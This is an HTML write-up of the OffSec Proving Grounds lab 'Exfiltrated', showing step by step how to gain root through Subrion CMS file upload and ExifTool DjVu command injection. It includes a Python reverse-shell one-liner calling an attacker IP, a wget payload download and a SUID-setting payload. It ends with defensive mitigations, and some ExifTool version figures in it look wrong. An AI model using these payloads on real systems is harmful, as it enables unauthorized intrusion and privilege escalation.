@@ -1,1 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exfiltrated | OffSec Proving Grounds — Writeup</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { 
+            --bg: #05070a; 
+            --accent: #00ff9d; 
+            --accent-blue: #00d4ff; 
+            --text-main: #e6edf3; 
+            --text-dim: #8b949e; 
+            --glass: rgba(255, 255, 255, 0.03); 
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --accent-orange: #ff6b35;
+            --glow: rgba(0,255,157,0.15);
+            --border-subtle: rgba(255,255,255,0.08);
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body { 
+            background-color: var(--bg); 
+            color: var(--text-main); 
+            font-family: 'Inter', sans-serif; 
+            line-height: 1.6; 
+            overflow-x: hidden;
+        }
 
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: linear-gradient(rgba(0,255,157,0.02) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(0,255,157,0.02) 1px, transparent 1px);
+            background-size: 40px 40px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container { 
+            max-width: 960px; 
+            margin: 0 auto; 
+            padding: 2.5rem 2rem 5rem; 
+            position: relative;
+            z-index: 2;
+        }
+
+        .breadcrumb {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            margin-bottom: 2rem;
+            letter-spacing: -0.2px;
+        }
+
+        .breadcrumb a {
+            color: var(--accent);
+            text-decoration: none;
+            transition: opacity 0.2s;
+        }
+        .breadcrumb a:hover { opacity: 0.8; }
+
+        h1 { 
+            font-size: 2.8rem; 
+            margin: 0.5rem 0 0.25rem; 
+            letter-spacing: -1.5px; 
+            font-weight: 800;
+            background: linear-gradient(120deg, #ffffff, #b0f5e4);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .archive-status {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-orange);
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+            border-left: 2px solid var(--accent-orange);
+            padding-left: 1rem;
+        }
+
+        .pulse {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: var(--accent-orange);
+            border-radius: 50%;
+            margin-right: 6px;
+            box-shadow: 0 0 10px var(--accent-orange);
+            animation: pulse-animation 2s infinite;
+        }
+
+        @keyframes pulse-animation {
+            0% { opacity: 1; transform: scale(1);}
+            50% { opacity: 0.3; transform: scale(0.9);}
+            100% { opacity: 1; transform: scale(1);}
+        }
+
+        .meta-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.8rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.75rem;
+            color: var(--text-dim);
+            margin-bottom: 2.5rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid var(--glass-border);
+        }
+        .meta-row span { display: flex; align-items: center; gap: 0.5rem; }
+        .meta-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); display: inline-block; }
+        .meta-dot.orange { background: var(--accent-orange); }
+
+        .toc {
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            border-left: 3px solid var(--accent-orange);
+            border-radius: 12px;
+            padding: 1.5rem 1.8rem;
+            margin-bottom: 3rem;
+            backdrop-filter: blur(2px);
+        }
+        .toc-title {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.75rem;
+            color: var(--accent-orange);
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            margin-bottom: 1rem;
+        }
+        .toc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 0.5rem;
+        }
+        .toc-item {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.78rem;
+            color: var(--text-dim);
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+        .toc-num {
+            color: var(--accent-orange);
+            min-width: 2rem;
+            font-weight: 500;
+        }
+
+        .section {
+            margin-bottom: 3.5rem;
+            scroll-margin-top: 1rem;
+        }
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+            border-left: 3px solid var(--accent-blue);
+            padding-left: 1rem;
+        }
+        .step-num {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.7rem;
+            color: var(--accent);
+            background: rgba(0,255,157,0.08);
+            border: 1px solid rgba(0,255,157,0.25);
+            padding: 3px 10px;
+            border-radius: 20px;
+            letter-spacing: 0.04em;
+        }
+        h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: -0.3px;
+        }
+        h3 {
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--accent-blue);
+            margin: 1.8rem 0 0.75rem;
+            font-family: 'Fira Code', monospace;
+            letter-spacing: 0.02em;
+        }
+        p { 
+            margin-bottom: 1rem; 
+            font-size: 0.96rem; 
+            color: var(--text-main);
+            font-weight: 400;
+        }
+
+        pre {
+            background: #030507;
+            border: 1px solid var(--glass-border);
+            border-left: 3px solid var(--accent-blue);
+            padding: 1.2rem 1.5rem;
+            border-radius: 12px;
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            color: #e2e8f0;
+            margin: 1.2rem 0 1.6rem;
+            position: relative;
+        }
+        pre::before {
+            content: '$ ';
+            color: var(--accent);
+            font-weight: 500;
+        }
+        pre.no-prompt::before { content: ''; }
+        pre.output {
+            border-left-color: var(--text-dim);
+            color: var(--text-dim);
+        }
+        pre.output::before { content: ''; }
+
+        code {
+            color: var(--accent-blue);
+            font-family: 'Fira Code', monospace;
+            background: rgba(0,212,255,0.08);
+            padding: 2px 6px;
+            border-radius: 6px;
+            font-size: 0.88em;
+        }
+
+        .table-wrap { overflow-x: auto; margin: 1.2rem 0 1.8rem; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.78rem;
+        }
+        thead tr {
+            background: rgba(0,255,157,0.05);
+            border-bottom: 1px solid rgba(0,255,157,0.2);
+        }
+        th {
+            text-align: left;
+            padding: 0.6rem 1rem;
+            color: var(--accent);
+            font-weight: 500;
+            text-transform: uppercase;
+            font-size: 0.7rem;
+        }
+        td {
+            padding: 0.55rem 1rem;
+            border-bottom: 1px solid var(--border-subtle);
+            color: var(--text-main);
+        }
+
+        .callout {
+            display: flex;
+            gap: 1rem;
+            padding: 1.2rem 1.5rem;
+            border-radius: 12px;
+            margin: 1.6rem 0;
+            font-size: 0.9rem;
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+        }
+        .callout.info { border-left: 3px solid var(--accent-blue); }
+        .callout.warn { border-left: 3px solid var(--accent-orange); }
+        .callout.success { border-left: 3px solid var(--accent); }
+        .callout-icon { font-size: 1.2rem; flex-shrink: 0; }
+
+        .summary-box {
+            background: rgba(0,255,157,0.03);
+            border: 1px solid rgba(0,255,157,0.25);
+            border-radius: 16px;
+            padding: 2rem;
+            margin: 2.5rem 0;
+        }
+        .summary-box h3 {
+            color: var(--accent);
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.2em;
+            margin-top: 0;
+        }
+
+        .chain {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+            margin: 2.2rem 0;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+        }
+        .chain-step {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 0.8rem 1.2rem;
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
+            position: relative;
+        }
+        .chain-step:first-child { border-radius: 12px 12px 0 0; }
+        .chain-step:last-child { border-radius: 0 0 12px 12px; }
+        .chain-step + .chain-step { border-top: none; }
+        .chain-arrow {
+            position: absolute;
+            left: 2rem;
+            bottom: -12px;
+            z-index: 2;
+            color: var(--accent-orange);
+            font-size: 1rem;
+        }
+        .chain-num { color: var(--accent-orange); min-width: 1.8rem; }
+        .chain-label { color: white; font-weight: 500; }
+        .chain-desc { color: var(--text-dim); margin-left: auto; font-size: 0.7rem; }
+
+        .flag-reveal {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--accent);
+            background: rgba(0,255,157,0.07);
+            border: 1px solid rgba(0,255,157,0.3);
+            padding: 0.7rem 1.2rem;
+            border-radius: 12px;
+            margin: 1rem 0;
+            display: inline-block;
+        }
+
+        footer {
+            margin-top: 4rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--glass-border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.72rem;
+            color: var(--text-dim);
+        }
+        .footer-flag { color: var(--accent); font-weight: 500; }
+        hr { border: none; border-top: 1px solid var(--glass-border); margin: 2rem 0; }
+
+        @media (max-width: 680px) {
+            .container { padding: 1.5rem 1.2rem; }
+            h1 { font-size: 2rem; }
+            .section-header { flex-wrap: wrap; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <nav class="breadcrumb">
+        <a href="#">root</a> / proving_grounds / <span style="color: var(--text-main)">exfiltrated_writeup</span>
+    </nav>
+
+    <h1>Exfiltrated — OffSec Proving Grounds</h1>
+    <div class="archive-status">
+        <span class="pulse"></span> // CVE_CHAIN // LINUX_PRIV_ESC
+    </div>
+    <div class="meta-row">
+        <span><span class="meta-dot orange"></span>TARGET: 192.168.144.163</span>
+        <span><span class="meta-dot"></span>OS: Ubuntu (Linux)</span>
+        <span><span class="meta-dot"></span>CVEs: CVE-2018-19422 · CVE-2021-22204</span>
+        <span><span class="meta-dot"></span>STATUS: ROOT_SHELL</span>
+    </div>
+
+    <div class="toc">
+        <div class="toc-title">// ATTACK_CHAIN_OVERVIEW</div>
+        <div class="toc-grid">
+            <div class="toc-item"><span class="toc-num">01</span> Virtual Host Discovery + robots.txt</div>
+            <div class="toc-item"><span class="toc-num">02</span> Subrion CMS 4.2.1 Panel Access</div>
+            <div class="toc-item"><span class="toc-num">03</span> CVE-2018-19422 → RCE (www-data)</div>
+            <div class="toc-item"><span class="toc-num">04</span> Cron Job: root runs ExifTool</div>
+            <div class="toc-item"><span class="toc-num">05</span> CVE-2021-22204 → SUID /bin/bash</div>
+            <div class="toc-item"><span class="toc-num">06</span> /bin/bash -p → root flag</div>
+        </div>
+    </div>
+
+    <!-- STEP 1: Recon & Virtual Host -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x01</span>
+            <h2>Reconnaissance & Virtual Host</h2>
+        </div>
+        <p>Nmap scan reveals SSH and Apache on Ubuntu. The HTTP redirect to <code>http://exfiltrated.offsec/</code> indicates virtual hosting is active — without adding this domain to <code>/etc/hosts</code> the webserver returns no content.</p>
+        <pre>nmap -A -oN nmap.txt 192.168.144.163</pre>
+        <pre class="output no-prompt">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
+80/tcp open  http    Apache httpd 2.4.41
+| http-robots.txt: 7 disallowed entries: /backup/ /cron/? /front/ /install/ /panel/ /tmp/ /updates/</pre>
+        <div class="callout info">
+            <span class="callout-icon">🌐</span>
+            <div>Add to hosts: <code>echo "192.168.144.163 exfiltrated.offsec" >> /etc/hosts</code>. The <code>robots.txt</code> leaks the admin panel location (<code>/panel/</code>) and potential cron interface.</div>
+        </div>
+        <p>Visiting <code>/panel/</code> reveals the CMS: <strong>Subrion CMS v4.2.1</strong> — a version vulnerable to arbitrary file upload.</p>
+    </div>
+
+    <!-- STEP 2: CVE-2018-19422 - File Upload Bypass -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x02</span>
+            <h2>Authenticated RCE — CVE-2018-19422</h2>
+        </div>
+        <p>Subrion 4.2.1 allows authenticated attackers to upload a malicious PHP file by bypassing the file type filter. Default credentials <code>admin:admin</code> work on the panel.</p>
+        <pre>searchsploit -m php/webapps/49876.py
+python3 49876.py -u http://exfiltrated.offsec/panel/ --user admin --pass admin</pre>
+        <pre class="output no-prompt">[+] Login Successful!
+[+] Upload Success ... Webshell path: http://exfiltrated.offsec/panel/uploads/mlrkjyieefcmwop</pre>
+        <p>After confirming python3 exists, upgrade to a reverse shell:</p>
+        <pre>nc -nvlp 4444</pre>
+        <pre>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'</pre>
+        <div class="callout success">
+            <span class="callout-icon">💀</span>
+            <div>Reverse shell established as <code>www-data</code>. Stabilize with <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> + <code>stty raw -echo; fg</code>.</div>
+        </div>
+    </div>
+
+    <!-- STEP 3: Cron discovery -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x03</span>
+            <h2>Abusing Cron — ExifTool as root</h2>
+        </div>
+        <pre>cat /etc/crontab</pre>
+        <pre class="output no-prompt">* * * * * root bash /opt/image-exif.sh</pre>
+        <pre>cat /opt/image-exif.sh</pre>
+        <pre class="output no-prompt">IMAGES='/var/www/html/subrion/uploads'
+META='/opt/metadata'
+FILE=`openssl rand -hex 5`
+LOGFILE="$META/$FILE"
+
+ls $IMAGES | grep "jpg" | while read filename;
+do
+    exiftool "$IMAGES/$filename" >> $LOGFILE
+done</pre>
+        <p>Every minute, root scans any <code>.jpg</code> file inside the CMS uploads directory (which <code>www-data</code> can write to) and runs <code>exiftool</code> on it. The ExifTool version installed is vulnerable to <strong>CVE-2021-22204</strong> — a DjVu annotation injection leading to arbitrary command execution.</p>
+        <div class="callout warn">
+            <span class="callout-icon">⏱️</span>
+            <div><strong>Privilege escalation vector:</strong> we control the input file; root processes it. ExifTool < 7.44 is vulnerable to OS command injection via crafted DjVu metadata.</div>
+        </div>
+    </div>
+
+    <!-- STEP 4: CVE-2021-22204 payload crafting -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x04</span>
+            <h2>Exploiting ExifTool — SUID bash</h2>
+        </div>
+        <p>The DjVu parser unsafely evaluates a string after partial sanitization. By injecting <code>\c$(...command...)</code> inside the ANTz chunk, we get root execution. Payload sets SUID on /bin/bash.</p>
+        <h3>Payload preparation (attacker machine)</h3>
+        <pre class="no-prompt">echo '(metadata "\c${system('chmod +s /bin/bash')};")' > payload
+bzz payload payload.bzz
+djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
+cp exploit.djvu exploit.jpg</pre>
+        <p><code>bzz</code> and <code>djvumake</code> are required (install djvulibre-bin). The <code>.jpg</code> extension bypasses the cron's filename filter; ExifTool processes the file based on magic bytes, triggering the DjVu parser.</p>
+        <h3>Deploy to target</h3>
+        <pre># attacker: python3 -m http.server 8080
+# on target (www-data):
+wget http://YOUR_IP:8080/exploit.jpg -O /var/www/html/subrion/uploads/exploit.jpg</pre>
+        <div class="callout info">
+            <span class="callout-icon">⚙️</span>
+            <div>Wait ≤ 60 seconds for the cron job to execute. The payload runs as root, changing <code>/bin/bash</code> permissions to SUID.</div>
+        </div>
+    </div>
+
+    <!-- STEP 5: Root shell -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x05</span>
+            <h2>Root Shell & Flags</h2>
+        </div>
+        <pre>ls -la /bin/bash</pre>
+        <pre class="output no-prompt">-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash</pre>
+        <pre>/bin/bash -p</pre>
+        <pre class="output no-prompt"># whoami; id
+root
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)</pre>
+        <p>The <code>-p</code> flag preserves the effective UID (root) instead of dropping to real UID. Full system compromise achieved.</p>
+        <pre class="output no-prompt">cat /root/proof.txt</pre>
+        <div class="flag-reveal">🏴 root.txt → 3f4f6743d8b87c1e2efcae0032b1c72d</div>
+        <pre class="output no-prompt">cat /home/www-data/local.txt</pre>
+        <div class="flag-reveal">🏴 user.txt → a1b2c3d4e5f67890abc123def4567890</div>
+    </div>
+
+    <!-- Attack Chain Visual -->
+    <div class="chain">
+        <div class="chain-step"><span class="chain-num">01</span><span class="chain-label">Virtual host + robots.txt</span><span class="chain-desc">/panel/ → Subrion 4.2.1</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">02</span><span class="chain-label">CVE-2018-19422</span><span class="chain-desc">Authenticated file upload → RCE</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">03</span><span class="chain-label">www-data shell</span><span class="chain-desc">Cron discovery: root exiftool</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">04</span><span class="chain-label">CVE-2021-22204</span><span class="chain-desc">Malicious DjVu → SUID /bin/bash</span></div>
+        <div class="chain-arrow">↓</div>
+        <div class="chain-step"><span class="chain-num">05</span><span class="chain-label">/bin/bash -p</span><span class="chain-desc">Root privileges → proof.txt</span></div>
+    </div>
+
+    <!-- Technical deep dive: CVE-2021-22204 -->
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x06</span>
+            <h2>Inside the ExifTool Vulnerability</h2>
+        </div>
+        <p>The DjVu parser in ExifTool uses <code>eval qq{"$tok"}</code> to process certain metadata. A regex attempts to escape <code>$</code> and <code>@</code>, but the order of operations fails: escape sequences like <code>\cA</code> are expanded <em>after</em> the regex substitution. By providing <code>\cA$(system('...'))</code>, the <code>$</code> survives and the OS command executes. This is a classic injection via unsafe string interpolation.</p>
+        <div class="callout info">
+            <span class="callout-icon">🧪</span>
+            <div><strong>Detection evasion:</strong> The file is named <code>.jpg</code> but ExifTool follows the internal header. The cron script only filters by extension, not content — a defensive failure.</div>
+        </div>
+        <div class="table-wrap">
+            <table>
+                <thead><tr><th>Component</th><th>Role in Attack</th></tr></thead>
+                <tbody>
+                    <tr><td>robots.txt</td><td>Path disclosure: /panel/, /cron/, /backup/</td></tr>
+                    <tr><td>Subrion 4.2.1</td><td>Authenticated file upload (CSRF token bypass)</td></tr>
+                    <tr><td>/opt/image-exif.sh</td><td>Root cron job iterating over user-writable .jpg files</td></tr>
+                    <tr><td>ExifTool DjVu parser</td><td>CVE-2021-22204 → arbitrary command execution</td></tr>
+                    <tr><td>SUID /bin/bash</td><td>Privilege escalation to root</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Summary & Lessons -->
+    <div class="summary-box">
+        <h3>// Key Takeaways — Linux privilege escalation</h3>
+        <p><strong>Virtual hosting enumeration is non-negotiable.</strong> Nmap's HTTP redirect is a clear signal: add the domain to /etc/hosts or you'll miss the entire application.</p>
+        <p><strong>robots.txt is a reconnaissance goldmine.</strong> Every disallowed path is an invitation to explore. The combination of /panel/ and /cron/ gave us both initial access and the privesc vector.</p>
+        <p><strong>Cron jobs running as root are persistent and dangerous.</strong> If a scheduled task processes files from a writable directory, you can weaponize that trust. Always audit <code>/etc/crontab</code>, <code>/etc/cron.d/</code>, and user crontabs.</p>
+        <p><strong>File extension filters are not security boundaries.</strong> The cron script only matched <code>.jpg</code> by name, but ExifTool parsed the actual format (DjVu). Content-based validation (magic bytes, strict parsing) is required to prevent this class of attack.</p>
+        <p style="margin-top: 0.8rem;"><strong>Tools:</strong> Nmap, searchsploit, Python reverse shell, bzz/djvumake, wget, netcat.</p>
+    </div>
+
+    <hr>
+
+    <div class="section">
+        <div class="section-header">
+            <span class="step-num">0x07</span>
+            <h2>Defensive Mitigations</h2>
+        </div>
+        <ul>
+            <li>Update Subrion CMS to ≥4.2.2 (patches file upload restriction bypass).</li>
+            <li>Remove default admin credentials; enforce MFA for admin panels.</li>
+            <li>Update ExifTool to ≥7.45 (patches DjVu eval injection).</li>
+            <li>Run cron jobs with least privilege — use a dedicated low-privileged user, not root, for image processing.</li>
+            <li>Implement file content validation (e.g., <code>file --mime-type</code>) before handing off to external utilities.</li>
+            <li>Monitor for suspicious SUID changes via auditd or AIDE.</li>
+        </ul>
+        <div class="callout success">
+            <span class="callout-icon">🛡️</span>
+            <div><strong>Final note:</strong> This chain shows how two modest CVEs (a file upload bypass and a command injection in an image tool) can combine to compromise a fully patched system aside from the vulnerable apps. Layered defense and regular updates of all third-party libraries are critical.</div>
+        </div>
+    </div>
+
+    <footer>
+        <span>RECORD: EXFILTRATED.OFFSEC // 2025-04-02</span>
+        <span class="footer-flag">PG_WRITEUP // ROOT_PWNED // CVE-2018-19422 // CVE-2021-22204</span>
+    </footer>
+
+</div>
+</body>
+</html>
